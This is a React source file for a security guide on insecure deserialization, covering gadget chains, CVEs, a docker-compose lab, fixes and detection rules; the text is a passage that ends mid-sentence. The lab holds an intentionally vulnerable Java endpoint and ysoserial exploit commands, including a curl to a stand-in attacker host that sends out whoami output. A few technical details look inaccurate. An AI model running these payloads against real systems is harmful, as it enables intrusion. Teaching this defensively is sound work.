import { Helmet } from '@dr.pogodin/react-helmet';

const guideUrl = 'https://proksiabel.ee/guides/deserialization-explained';

const techArticleSchema = {
  '@context': 'https://schema.org',
  '@type': 'TechArticle',
  headline: 'Insecure Deserialization Explained: Attack Examples & Prevention',
  description:
    'Insecure deserialization (CWE-502) explained: how gadget chains turn object reconstruction into RCE, in Java, Python, PHP, and Node.js. Real CVEs, a reproducible docker-compose lab, detection rules, and per-language fix patterns.',
  datePublished: '2026-09-15',
  dateModified: '2026-09-15',
  inLanguage: 'en',
  mainEntityOfPage: guideUrl,
  author: {
    '@type': 'Organization',
    name: 'ProksiAbel OÜ',
    url: 'https://proksiabel.ee/',
  },
  publisher: {
    '@type': 'Organization',
    name: 'ProksiAbel OÜ',
    url: 'https://proksiabel.ee/',
  },
};

export default function DeserializationGuide() {
  return (
    <>
      <Helmet>
        <script type='application/ld+json'>{JSON.stringify(techArticleSchema)}</script>
      </Helmet>

      <div className='min-h-screen bg-slate-900 pt-24 pb-12'>
        <div className='max-w-4xl mx-auto px-4 sm:px-6 lg:px-8'>
          <p className='text-sm uppercase tracking-wide text-sky-400 font-semibold mb-4'>
            Technical Guide
          </p>
          <h1 className='text-3xl md:text-4xl font-bold text-white mb-6'>
            Insecure Deserialization Explained: Attack Examples &amp; Prevention
          </h1>
          <p className='text-slate-400 text-lg leading-relaxed mb-10'>
            Insecure deserialization lets an attacker turn a byte stream into arbitrary code
            execution by abusing native deserialization features the developer did not ask for. It
            is CWE-502, a class of vulnerability present in Java, Python, PHP, .NET and Node.js.
            This guide covers the gadget-chain anatomy, a reproducible docker-compose lab, real
            CVEs, detection rules, and per-language fixes.
          </p>

          <div className='max-w-none text-slate-300'>
            <section className='mb-10'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>
                What insecure deserialization is
              </h2>
              <p className='leading-relaxed mb-4'>
                MITRE defines{' '}
                <a
                  className='text-sky-400 hover:text-sky-300'
                  href='https://cwe.mitre.org/data/definitions/502.html'
                  rel='noopener noreferrer'
                >
                  CWE-502
                </a>{' '}
                as the product &quot;deserializ[ing] untrusted data without sufficiently ensuring
                that the resulting data will be valid.&quot; The weakness is a base-level CWE and
                spans all languages with native binary serialization: Java&apos;s{' '}
                <code className='text-slate-100'>java.io.Serializable</code>, Python&apos;s{' '}
                <code className='text-slate-100'>pickle</code>, PHP&apos;s{' '}
                <code className='text-slate-100'>unserialize()</code>, .NET&apos;s{' '}
                <code className='text-slate-100'>BinaryFormatter</code>, and Node.js ecosystem
                packages like <code className='text-slate-100'>node-serialize</code>.
              </p>
              <p className='leading-relaxed mb-4'>
                The OWASP Top 10:2021 lists Insecure Deserialization as{' '}
                <a
                  className='text-sky-400 hover:text-sky-300'
                  href='https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/'
                  rel='noopener noreferrer'
                >
                  A08:2021 Software and Data Integrity Failures
                </a>
                , a category that also includes software supply-chain risks. The previous edition
                (2017) gave it its own slot as A8:2017. The 2021 placement is broader but the root
                cause is unchanged: the deserialization primitive accepts both data and executable
                code in the same stream, and no integrity boundary exists between them.
              </p>
              <p className='leading-relaxed'>
                Practical consequence: you cannot block deserialization attacks with an allow-list
                of values or a regex. The attack surface is the deserialization method itself. The
                fix is either to not use native serialization with untrusted input, or to apply
                strict class-level allow-listing at the deserializer.
              </p>
            </section>

            <section className='mb-10'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>
                Anatomy: how gadget chains work
              </h2>
              <p className='leading-relaxed mb-4'>
                A <strong>gadget chain</strong> is a sequence of method calls that starts at a
                deserialization method (e.g. <code className='text-slate-100'>readObject()</code>,
                <code className='text-slate-100'>unserialize()</code>,{' '}
                <code className='text-slate-100'>pickle.loads()</code>) and ends at an execution
                sink (<code className='text-slate-100'>Runtime.exec()</code>,
                <code className='text-slate-100'>system()</code>,{' '}
                <code className='text-slate-100'>eval()</code>). The chain uses only classes that
                are already present on the application classpath — the attacker never deploys new
                code. The gadget classes are &quot;innocent&quot; library classes whose constructor,
                <code className='text-slate-100'>readObject()</code>, or finalizer happens to call a
                method that the attacker can control the argument to.
              </p>
              <p className='leading-relaxed mb-4'>
                The canonical example is the Apache Commons Collections (ACC) gadget chain
                discovered by FoxGlove Security in 2015. Java&apos;s{' '}
                <code className='text-slate-100'>InvocationTransformer</code> class, part of
                commons-collections, implements a pattern that lets an attacker chain arbitrary
                method calls. When a serialized object containing a crafted
                <code className='text-slate-100'>InvocationTransformer</code> is deserialized via{' '}
                <code className='text-slate-100'>ObjectInputStream.readObject()</code>, the chain
                resolves to <code className='text-slate-100'>Runtime.exec()</code> with
                attacker-supplied command arguments. The CVE cluster that followed (CVE-2015-4852
                WebLogic, CVE-2015-7501 Apache Commons Collections, CVE-2015-8103 JBoss) established
                that any Java application accepting serialized objects over the network is
                effectively a free RCE vector.
              </p>
              <p className='leading-relaxed mb-4'>
                The ysoserial tool (
                <a
                  className='text-sky-400 hover:text-sky-300'
                  href='https://github.com/frohoff/ysoserial'
                  rel='noopener noreferrer'
                >
                  GitHub
                </a>
                ) packages multiple gadget chains for Java. Each chain targets a different classpath
                dependency: CommonsCollections1-6, Jdk7u21, JRMPClient, C3P0, URLDNS, BeanShell, and
                others. The attacker chooses the chain that matches the target application&apos;s
                known dependencies.
              </p>
            </section>

            <section className='mb-10'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>
                Serialization format identification
              </h2>
              <p className='leading-relaxed mb-4'>
                Before you can exploit a deserialization vulnerability, you need to identify the
                serialization format. Each language has tell-tale signatures:
              </p>
              <div className='overflow-x-auto mb-4'>
                <table className='w-full text-sm text-left border-collapse'>
                  <thead>
                    <tr className='border-b border-slate-700'>
                      <th className='py-3 pr-4 text-slate-100 font-semibold'>Language</th>
                      <th className='py-3 pr-4 text-slate-100 font-semibold'>
                        Key classes / functions
                      </th>
                      <th className='py-3 pr-4 text-slate-100 font-semibold'>Wire signature</th>
                      <th className='py-3 text-slate-100 font-semibold'>Detection hint</th>
                    </tr>
                  </thead>
                  <tbody className='text-slate-300'>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 font-mono text-sky-400'>Java</td>
                      <td className='py-3 pr-4'>
                        <code className='text-slate-100'>ObjectInputStream.readObject()</code>
                      </td>
                      <td className='py-3 pr-4'>
                        Hex: <code className='text-slate-100'>AC ED 00 05</code>
                        <br />
                        Base64: <code className='text-slate-100'>rO0</code>
                      </td>
                      <td className='py-3'>
                        Content-Type:{' '}
                        <code className='text-slate-100'>application/x-java-serialized-object</code>
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 font-mono text-sky-400'>Python</td>
                      <td className='py-3 pr-4'>
                        <code className='text-slate-100'>pickle.loads()</code>
                      </td>
                      <td className='py-3 pr-4'>
                        Base64: starts with <code className='text-slate-100'>gASV</code>
                        <br />
                        (protocol 2+) or trailing dot <code className='text-slate-100'>.</code>
                      </td>
                      <td className='py-3'>
                        Embedded <code className='text-slate-100'>__reduce__</code> or{' '}
                        <code className='text-slate-100'>cos.system</code> in payload
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 font-mono text-sky-400'>PHP</td>
                      <td className='py-3 pr-4'>
                        <code className='text-slate-100'>unserialize()</code>
                      </td>
                      <td className='py-3 pr-4'>
                        Text format: <code className='text-slate-100'>{'O:4:"User":2:{...}'}</code>
                      </td>
                      <td className='py-3'>
                        Always starts with <code className='text-slate-100'>O:</code>,{' '}
                        <code className='text-slate-100'>a:</code>,{' '}
                        <code className='text-slate-100'>s:</code>,{' '}
                        <code className='text-slate-100'>b:</code>,{' '}
                        <code className='text-slate-100'>N;</code>
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 font-mono text-sky-400'>.NET</td>
                      <td className='py-3 pr-4'>
                        <code className='text-slate-100'>BinaryFormatter.Deserialize()</code>
                      </td>
                      <td className='py-3 pr-4'>
                        Base64: starts with <code className='text-slate-100'>{'AAEAAAD/////'}</code>
                      </td>
                      <td className='py-3'>Type metadata visible in decoded form</td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 font-mono text-sky-400'>Node.js</td>
                      <td className='py-3 pr-4'>
                        <code className='text-slate-100'>node-serialize</code>,{' '}
                        <code className='text-slate-100'>funcster</code>
                      </td>
                      <td className='py-3 pr-4'>
                        JSON with <code className='text-slate-100'>_$$ND_FUNC$$_</code> prefix
                      </td>
                      <td className='py-3'>
                        <code className='text-slate-100'>eval()</code> on deserialized function
                        strings
                      </td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </section>

            <section className='mb-10'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>Real-world CVEs</h2>
              <div className='overflow-x-auto mb-4'>
                <table className='w-full text-sm text-left border-collapse'>
                  <thead>
                    <tr className='border-b border-slate-700'>
                      <th className='py-3 pr-4 text-slate-100 font-semibold'>CVE</th>
                      <th className='py-3 pr-4 text-slate-100 font-semibold'>Product</th>
                      <th className='py-3 pr-4 text-slate-100 font-semibold'>CVSS</th>
                      <th className='py-3 pr-4 text-slate-100 font-semibold'>Language</th>
                      <th className='py-3 text-slate-100 font-semibold'>Impact</th>
                    </tr>
                  </thead>
                  <tbody className='text-slate-300'>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4'>
                        <a
                          className='text-sky-400 hover:text-sky-300'
                          href='https://nvd.nist.gov/vuln/detail/CVE-2015-4852'
                          rel='noopener noreferrer'
                        >
                          CVE-2015-4852
                        </a>
                      </td>
                      <td className='py-3 pr-4'>Oracle WebLogic</td>
                      <td className='py-3 pr-4'>7.5 (pre-2016) / 9.8 (reanalysis)</td>
                      <td className='py-3 pr-4'>Java</td>
                      <td className='py-3'>
                        Unauthenticated RCE via T3 protocol deserialization; the first widespread
                        ACC gadget-chain exploitation in the wild
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4'>
                        <a
                          className='text-sky-400 hover:text-sky-300'
                          href='https://nvd.nist.gov/vuln/detail/CVE-2017-10271'
                          rel='noopener noreferrer'
                        >
                          CVE-2017-10271
                        </a>
                      </td>
                      <td className='py-3 pr-4'>Oracle WebLogic WLS</td>
                      <td className='py-3 pr-4'>7.5</td>
                      <td className='py-3 pr-4'>Java</td>
                      <td className='py-3'>
                        XMLDecoder deserialization in the WLS Security component; wormable in
                        2017–2018 campaigns
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4'>
                        <a
                          className='text-sky-400 hover:text-sky-300'
                          href='https://nvd.nist.gov/vuln/detail/CVE-2024-44902'
                          rel='noopener noreferrer'
                        >
                          CVE-2024-44902
                        </a>
                      </td>
                      <td className='py-3 pr-4'>ThinkPHP</td>
                      <td className='py-3 pr-4'>9.8</td>
                      <td className='py-3 pr-4'>PHP</td>
                      <td className='py-3'>
                        Insecure deserialization in ThinkPHP &le;6.1.2; unauthenticated RCE via
                        gadget chain in PHP session handling
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4'>
                        <a
                          className='text-sky-400 hover:text-sky-300'
                          href='https://nvd.nist.gov/vuln/detail/CVE-2025-8875'
                          rel='noopener noreferrer'
                        >
                          CVE-2025-8875
                        </a>
                      </td>
                      <td className='py-3 pr-4'>N-able N-central</td>
                      <td className='py-3 pr-4'>9.8</td>
                      <td className='py-3 pr-4'>Java</td>
                      <td className='py-3'>
                        Insecure deserialization in N-central&le;2025.3; actively exploited in the
                        wild per CISA KEV (April 2026)
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4'>
                        <a
                          className='text-sky-400 hover:text-sky-300'
                          href='https://github.com/advisories/GHSA-c2jg-5cp7-6wc7'
                          rel='noopener noreferrer'
                        >
                          GHSA-c2jg-5cp7-6wc7
                        </a>
                      </td>
                      <td className='py-3 pr-4'>Pipecat (AI pipeline)</td>
                      <td className='py-3 pr-4'>9.8</td>
                      <td className='py-3 pr-4'>Python</td>
                      <td className='py-3'>
                        Pickle deserialization RCE in DailyTransport config; unauthenticated remote
                        code execution via crafted pickle payload
                      </td>
                    </tr>
                    <tr>
                      <td className='py-3 pr-4'>
                        <a
                          className='text-sky-400 hover:text-sky-300'
                          href='https://nvd.nist.gov/vuln/detail/CVE-2026-0763'
                          rel='noopener noreferrer'
                        >
                          CVE-2026-0763
                        </a>
                      </td>
                      <td className='py-3 pr-4'>GPT Academic</td>
                      <td className='py-3 pr-4'>9.8</td>
                      <td className='py-3 pr-4'>Python</td>
                      <td className='py-3'>
                        Pickle deserialization in GPT Academic &le;3.91; unauthenticated RCE,
                        actively exploited, CISA KEV March 2026
                      </td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </section>

            <section className='mb-10'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>
                Reproducible lab: Java deserialization RCE
              </h2>
              <p className='leading-relaxed mb-4'>
                This docker-compose lab runs a vulnerable Java Spring Boot application that
                deserializes user-supplied objects via{' '}
                <code className='text-slate-100'>ObjectInputStream.readObject()</code>. The attack
                container carries ysoserial and targets a known CommonsCollections gadget chain. A
                hardened version of the app uses SerialKiller class allow-listing.
              </p>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>Project structure</h3>
              <pre className='bg-slate-800 rounded-lg p-4 overflow-x-auto text-sm mb-4'>
                <code className='text-slate-200'>
                  {`deserialization-lab/
├── docker-compose.yml
├── vulnerable/
│   ├── Dockerfile
│   ├── pom.xml
│   └── src/main/java/com/deserlab/
│       └── DeserController.java
├── attacker/
│   └── Dockerfile
└── hardened/
    ├── Dockerfile
    ├── pom.xml
    └── src/main/java/com/deserlab/
        ├── DeserController.java
        └── SafeObjectInputStream.java`}
                </code>
              </pre>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>
                Vulnerable endpoint (DeserController.java)
              </h3>
              <pre className='bg-slate-800 rounded-lg p-4 overflow-x-auto text-sm mb-4'>
                <code className='text-slate-200'>
                  {`@PostMapping("/deserialize")
public String deserialize(@RequestBody byte[] data) {
    try {
        ByteArrayInputStream bais = new ByteArrayInputStream(data);
        ObjectInputStream ois = new ObjectInputStream(bais);
        Object obj = ois.readObject();  // VULNERABLE
        ois.close();
        return "Deserialized: " + obj.getClass().getName();
    } catch (Exception e) {
        return "Error: " + e.getMessage();
    }
}`}
                </code>
              </pre>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>
                Exploit command (from attacker container)
              </h3>
              <pre className='bg-slate-800 rounded-lg p-4 overflow-x-auto text-sm mb-4'>
                <code className='text-slate-200'>
                  {`# Generate payload (CommonsCollections1 chain, 'id' command)
java -jar ysoserial-all.jar CommonsCollections1 'id' > payload.bin

# Send to vulnerable endpoint — base64-encoded byte stream
curl -X POST http://vulnerable:8080/deserialize \\
  -H "Content-Type: application/octet-stream" \\
  --data-binary @payload.bin
# Response: Error: java.io.IOException: ...  (RCE already executed server-side)

# Blind RCE check (out-of-band via DNS)
java -jar ysoserial-all.jar CommonsCollections1 \\
  'curl http://attacker-controlled.oastify.com/$(whoami)' > payload2.bin
curl -X POST http://vulnerable:8080/deserialize \\
  -H "Content-Type: application/octet-stream" \\
  --data-binary @payload2.bin`}
                </code>
              </pre>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>docker-compose.yml</h3>
              <pre className='bg-slate-800 rounded-lg p-4 overflow-x-auto text-sm mb-4'>
                <code className='text-slate-200'>
                  {`version: '3.8'
services:
  vulnerable:
    build: ./vulnerable
    ports: ["8081:8080"]
  hardened:
    build: ./hardened
    ports: ["8082:8080"]
  attacker:
    build: ./attacker
    image: ysoserial:latest
    command: tail -f /dev/null
    depends_on: [vulnerable]`}
                </code>
              </pre>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>
                Hardened endpoint with class allow-listing
              </h3>
              <pre className='bg-slate-800 rounded-lg p-4 overflow-x-auto text-sm mb-4'>
                <code className='text-slate-200'>
                  {`public class SafeObjectInputStream extends ObjectInputStream {
    private static final Set<String> ALLOWED = Set.of(
        "com.deserlab.UserProfile",
        "com.deserlab.AuditLog",
        "java.util.ArrayList",
        "java.util.HashMap"
    );

    public SafeObjectInputStream(InputStream in) throws IOException {
        super(in);
    }

    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc)
            throws IOException, ClassNotFoundException {
        if (!ALLOWED.contains(desc.getName())) {
            throw new InvalidClassException(
                desc.getName(), "not in allow-list");
        }
        return super.resolveClass(desc);
    }
}

// Usage in controller:
SafeObjectInputStream ois =
    new SafeObjectInputStream(bais);
Object obj = ois.readObject();`}
                </code>
              </pre>
            </section>

            <section className='mb-10'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>Per-language fix patterns</h2>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>Java</h3>
              <ul className='list-disc list-inside space-y-2 mb-4'>
                <li>
                  Override <code className='text-slate-100'>ObjectInputStream.resolveClass()</code>{' '}
                  with a class allow-list (see hardened endpoint above). The{' '}
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://github.com/ikkisoft/SerialKiller'
                    rel='noopener noreferrer'
                  >
                    SerialKiller
                  </a>{' '}
                  library wraps this pattern.
                </li>
                <li>
                  Use a safe serialization framework: Jackson (JSON), Protocol Buffers, or Kryo with
                  a class registration list rather than raw{' '}
                  <code className='text-slate-100'>ObjectInputStream</code>.
                </li>
                <li>
                  Never expose <code className='text-slate-100'>XMLDecoder</code>,{' '}
                  <code className='text-slate-100'>XStream.fromXML()</code>, or{' '}
                  <code className='text-slate-100'>SnakeYAML.load()</code> to untrusted input.
                </li>
                <li>
                  Mark sensitive fields <code className='text-slate-100'>private transient</code> to
                  prevent data leakage via serialization.
                </li>
              </ul>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>Python</h3>
              <ul className='list-disc list-inside space-y-2 mb-4'>
                <li>
                  Never call <code className='text-slate-100'>pickle.loads()</code> on untrusted
                  data. There is no safe allow-list mechanism for pickle — it is design-insecure
                  with attacker-controlled input.
                </li>
                <li>
                  Use <code className='text-slate-100'>{'json.loads()'}</code> for trusted data
                  interchange. For complex objects, use a schema-based serializer like{' '}
                  <code className='text-slate-100'>marshmallow</code>.
                </li>
                <li>
                  If pickle is unavoidable (machine learning model files, Redis queue), load from a
                  path you control, never from user uploads or HTTP request bodies.
                </li>
                <li>
                  Audit for <code className='text-slate-100'>pickle.load</code>,{' '}
                  <code className='text-slate-100'>pickle.loads</code>,{' '}
                  <code className='text-slate-100'>yaml.load()</code> (use{' '}
                  <code className='text-slate-100'>yaml.safe_load()</code> instead),{' '}
                  <code className='text-slate-100'>jsonpickle.decode()</code>.
                </li>
              </ul>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>PHP</h3>
              <ul className='list-disc list-inside space-y-2 mb-4'>
                <li>
                  Never pass user input directly to{' '}
                  <code className='text-slate-100'>unserialize()</code>. Use{' '}
                  <code className='text-slate-100'>json_decode()</code> /{' '}
                  <code className='text-slate-100'>json_encode()</code> for data interchange.
                </li>
                <li>
                  If you must unserialize data from a database or cache, sign it with{' '}
                  <code className='text-slate-100'>hash_hmac()</code> and verify the signature
                  before deserializing.
                </li>
                <li>
                  PHP 7.x+ deprecated <code className='text-slate-100'>php://filter</code>{' '}
                  unserialize tricks. The <code className='text-slate-100'>__wakeup()</code> and{' '}
                  <code className='text-slate-100'>__destruct()</code> magic methods are still the
                  primary attack surface.
                </li>
                <li>
                  Configure <code className='text-slate-100'>session.serialize_handler</code> to{' '}
                  <code className='text-slate-100'>php_serialize</code> (not{' '}
                  <code className='text-slate-100'>php</code> or{' '}
                  <code className='text-slate-100'>php_binary</code>) to reduce session-based
                  deserialization attacks.
                </li>
              </ul>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>Node.js / JavaScript</h3>
              <ul className='list-disc list-inside space-y-2 mb-4'>
                <li>
                  Never use <code className='text-slate-100'>eval()</code> or{' '}
                  <code className='text-slate-100'>new Function()</code> on deserialized strings.
                  Packages like <code className='text-slate-100'>node-serialize</code> reconstruct
                  functions via <code className='text-slate-100'>eval()</code> internally.
                </li>
                <li>
                  Use JSON for data interchange:{' '}
                  <code className='text-slate-100'>JSON.parse()</code> /{' '}
                  <code className='text-slate-100'>JSON.stringify()</code>.
                </li>
                <li>
                  Avoid <code className='text-slate-100'>funcster</code>,{' '}
                  <code className='text-slate-100'>node-serialize</code>, and{' '}
                  <code className='text-slate-100'>serialize-javascript</code> in user-facing
                  endpoints.
                </li>
              </ul>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>Go</h3>
              <ul className='list-disc list-inside space-y-2 mb-4'>
                <li>
                  Go has no native binary serialization equivalent to Java serialization or Python
                  pickle. Use <code className='text-slate-100'>encoding/json</code> or{' '}
                  <code className='text-slate-100'>encoding/gob</code> with known types.
                </li>
                <li>
                  <code className='text-slate-100'>encoding/gob</code> is safe when decoding into a
                  pre-declared type (the decoder only populates fields of the target struct). Do not
                  use <code className='text-slate-100'>interface{}</code> as the decode target if
                  the stream comes from an untrusted source.
                </li>
                <li>
                  Third-party packages like{' '}
                  <code className='text-slate-100'>vmihailenco/msgpack/v5</code> or{' '}
                  <code className='text-slate-100'>ugorji/go/codec</code> with{' '}
                  <code className='text-slate-100'>interface{}</code> targets can be abused; always
                  decode into concrete types.
                </li>
              </ul>
            </section>

            <section className='mb-10'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>Detection rules</h2>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>
                Semgrep — Java unsafe deserialization
              </h3>
              <pre className='bg-slate-800 rounded-lg p-4 overflow-x-auto text-sm mb-4'>
                <code className='text-slate-200'>
                  {`rules:
  - id: java-unsafe-deserialization-objectinputstream
    patterns:
      - pattern: |
          new java.io.ObjectInputStream($STREAM).readObject()
      - pattern-not: |
          new $ALLOW_LISTED_CLASS(...).readObject()
    message: |
      Direct ObjectInputStream.readObject() on untrusted data. 
      Override resolveClass() with a class allow-list or use 
      a safe serialization format.
    severity: ERROR
    languages: [java]

  - id: java-xmldecoder-deserialization
    pattern: new java.beans.XMLDecoder($INPUT).readObject()
    message: XMLDecoder deserialization allows arbitrary object 
      instantiation; use JSON or a safe XML parser.
    severity: ERROR
    languages: [java]`}
                </code>
              </pre>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>Semgrep — Python pickle</h3>
              <pre className='bg-slate-800 rounded-lg p-4 overflow-x-auto text-sm mb-4'>
                <code className='text-slate-200'>
                  {`rules:
  - id: python-pickle-loads
    patterns:
      - pattern-either:
          - pattern: pickle.loads(...)
          - pattern: pickle.load(...)
          - pattern: yaml.load(...)
          - pattern: jsonpickle.decode(...)
    message: |
      Python pickle/yaml.load() deserialization of potentially 
      untrusted data can execute arbitrary code. Use json.loads()
      or yaml.safe_load() instead.
    severity: ERROR
    languages: [python]`}
                </code>
              </pre>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>
                Suricata — Java serialization stream detection
              </h3>
              <pre className='bg-slate-800 rounded-lg p-4 overflow-x-auto text-sm mb-4'>
                <code className='text-slate-200'>
                  {`alert tcp any any -> any any (
  msg:"JAVA-SERIALIZATION ObjectInputStream stream detected";
  content:"|ac ed 00 05|";
  fast_pattern;
  sid:1001001; rev:1;)

alert http any any -> any any (
  msg:"JAVA-SERIALIZATION Base64-encoded stream";
  content:"rO0"; http_client_body;
  sid:1001002; rev:1;)`}
                </code>
              </pre>
            </section>

            <section className='mb-10'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>
                Detection in black-box testing
              </h2>
              <p className='leading-relaxed mb-4'>
                When you do not have source code access, look for serialized data in these
                locations:
              </p>
              <ul className='list-disc list-inside space-y-2 mb-4'>
                <li>
                  <strong>Cookies:</strong> Base64-decoded values that start with{' '}
                  <code className='text-slate-100'>AC ED 00 05</code> or{' '}
                  <code className='text-slate-100'>O:...</code>
                </li>
                <li>
                  <strong>Hidden form fields:</strong> Many Java frameworks store session state in a{' '}
                  <code className='text-slate-100'>{'__VIEWSTATE'}</code> or similar hidden field.
                </li>
                <li>
                  <strong>Request body:</strong> Content-Type{' '}
                  <code className='text-slate-100'>application/x-java-serialized-object</code> or
                  raw byte streams.
                </li>
                <li>
                  <strong>URL parameters:</strong> Base64-encoded data in query strings or path
                  segments.
                </li>
                <li>
                  <strong>WebSocket messages:</strong> Binary WebSocket frames beginning with the
                  magic bytes.
                </li>
              </ul>
              <p className='leading-relaxed mb-4'>
                The Burp Suite{' '}
                <a
                  className='text-sky-400 hover:text-sky-300'
                  href='https://github.com/federicodotta/Java-Deserialization-Scanner'
                  rel='noopener noreferrer'
                >
                  Java Deserialization Scanner
                </a>{' '}
                extension automates the detection and exploitation process. It sends probes with
                known gadget chains and inspects responses for evidence of deserialization (timing
                changes, exceptions, out-of-band interactions).
              </p>
            </section>

            <section className='mb-10'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>
                Prevention decision matrix
              </h2>
              <div className='overflow-x-auto mb-4'>
                <table className='w-full text-sm text-left border-collapse'>
                  <thead>
                    <tr className='border-b border-slate-700'>
                      <th className='py-3 pr-4 text-slate-100 font-semibold'>#</th>
                      <th className='py-3 pr-4 text-slate-100 font-semibold'>Control</th>
                      <th className='py-3 pr-4 text-slate-100 font-semibold'>Effectiveness</th>
                      <th className='py-3 text-slate-100 font-semibold'>Verification</th>
                    </tr>
                  </thead>
                  <tbody className='text-slate-300'>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4'>1</td>
                      <td className='py-3 pr-4'>
                        Replace native serialization with JSON or Protocol Buffers
                      </td>
                      <td className='py-3 pr-4'>Complete — removes the attack surface entirely</td>
                      <td className='py-3'>
                        No <code className='text-slate-100'>ObjectInputStream</code>,{' '}
                        <code className='text-slate-100'>pickle.loads</code>,{' '}
                        <code className='text-slate-100'>unserialize()</code> in codebase
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4'>2</td>
                      <td className='py-3 pr-4'>Class allow-list on deserializer</td>
                      <td className='py-3 pr-4'>High — blocks gadget-class injection</td>
                      <td className='py-3'>
                        Allow-list is referenced; gadget-chain payload returns{' '}
                        <code className='text-slate-100'>InvalidClassException</code>
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4'>3</td>
                      <td className='py-3 pr-4'>Integrity check (HMAC) on serialized data</td>
                      <td className='py-3 pr-4'>
                        Moderate — prevents tampering but does not prevent deserialization of
                        attacker-signed data
                      </td>
                      <td className='py-3'>
                        HMAC key is not attacker-influenced; any modified payload rejected
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4'>4</td>
                      <td className='py-3 pr-4'>Egress filtering (network-level)</td>
                      <td className='py-3 pr-4'>
                        Defense-in-depth — limits data exfiltration but does not prevent RCE itself
                      </td>
                      <td className='py-3'>
                        Unexpected outbound connections from app tier generate alerts
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4'>5</td>
                      <td className='py-3 pr-4'>Update libraries with known gadget chains</td>
                      <td className='py-3 pr-4'>
                        Partial — removes common chains but novel chains are still possible
                      </td>
                      <td className='py-3'>
                        SBOM scan confirms no known gadget-chain libraries at exploitable versions
                      </td>
                    </tr>
                    <tr>
                      <td className='py-3 pr-4'>6</td>
                      <td className='py-3 pr-4'>Code review + CI gate with Semgrep</td>
                      <td className='py-3 pr-4'>
                        Prevention + detection — catches regressions before deploy
                      </td>
                      <td className='py-3'>A deliberately vulnerable commit fails CI pipeline</td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </section>

            <section className='mb-10'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>
                What does not work (and why teams still try it)
              </h2>
              <ul className='list-disc list-inside space-y-3'>
                <li>
                  <strong className='text-sky-400'>Blocking magic bytes. </strong>
                  Filtering <code className='text-slate-100'>AC ED 00 05</code> in a WAF. The
                  payload can be Base64-encoded, chunked, wrapped in HTTP compression, or obfuscated
                  inside a higher-level protocol. Moreover, this does nothing for PHP or Python
                  deserialization which have different signatures.
                </li>
                <li>
                  <strong className='text-sky-400'>
                    Input validation on deserialized objects.{' '}
                  </strong>
                  Validation runs <em>after</em> the object is fully constructed, so the gadget
                  chain has already executed. A <code className='text-slate-100'>__wakeup()</code>{' '}
                  or
                  <code className='text-slate-100'>readObject()</code> override fires before any
                  application validation code runs.
                </li>
                <li>
                  <strong className='text-sky-400'>
                    Using a deny-list of known dangerous classes.{' '}
                  </strong>
                  Novel gadget chains use classes the deny-list does not know about. An allow-list
                  is the only complete approach because it constrains the attacker to approved
                  classes.
                </li>
                <li>
                  <strong className='text-sky-400'>
                    Relying on &quot;we do not use a framework.&quot;{' '}
                  </strong>
                  Gadget chains use library classes, not framework classes. The Java stdlib itself
                  has been shown to contain usable gadgets (e.g. JDK7u21 chain uses only JDK runtime
                  classes).
                </li>
                <li>
                  <strong className='text-sky-400'>
                    Assuming JSON/YAML serialization is safe.{' '}
                  </strong>
                  <code className='text-slate-100'>yaml.load()</code> in Python is equivalent to
                  pickle — it instantiates arbitrary Python objects. SnakeYAML in Java also allows
                  arbitrary class instantiation. Use{' '}
                  <code className='text-slate-100'>yaml.safe_load()</code>
                  or configure a constructor with class restrictions.
                </li>
              </ul>
            </section>

            <section className='mb-10'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>Key takeaways</h2>
              <ul className='list-disc list-inside space-y-2'>
                <li>
                  Insecure deserialization (CWE-502) turns a byte stream into RCE via gadget chains
                  — sequences of method calls that start at the deserializer and end at an execution
                  sink.
                </li>
                <li>
                  The fix is structural: replace native serialization with safe interchange formats
                  (JSON, Protocol Buffers), or apply a class allow-list at the deserializer (Java
